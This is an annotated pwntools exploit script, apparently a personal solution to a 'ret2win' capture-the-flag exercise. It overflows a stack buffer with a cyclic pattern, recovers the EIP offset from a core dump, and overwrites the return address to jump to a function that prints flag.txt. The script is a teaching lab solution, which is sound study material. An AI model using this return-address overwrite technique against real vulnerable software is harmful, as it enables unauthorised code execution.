Why the code is the way it is?

# Start program
io = start()

# Find the straw to break the camels back
payload = cyclic(100) # 100 is larger than the 56 and 32 mentioned in the code 

# Print out the target address
info("%#x target", elf.symbols['ret2win']) # ret2win was found to have the system call to read flag.txt

# Send the payload
io.sendlineafter(">", payload) # Last character is > and we want the payload sent after it  

# Wait for the program to crash
io.wait() # Program should crash and we need to see why it crashed

# Open up the core file
core = io.corefile # Grabs the core file created

# Find EIP offset
eip_value = core.eip # saves the EIP
eip_offset = cyclic_find(eip_value) # Uses the cyclic to find the offset
info("Located EIP offset at {a}".format(a=eip_offset)) # Prints the offset

# Payload 
payload = flat(
        asm('nop') * eip_offset, # Think 'A' * number to reach the EIP
        elf.symbols.ret2win # Where we want to go (The function that reads flag.txt)
        )

write('payload', payload) # Save the payload incase you want to run it outside of python

# Start the program
io = start()

# Send the payload
io.sendlineafter("> ",payload) # Same as before
io.recv() # waiting to receive flag

# Get our flag!
flag = io.recvline()

try:
    success(flag) 
except AttributeError:
    print("[+] Flag: {}".format(str(flag))) # Success likes to not work for me so this is a simple fix
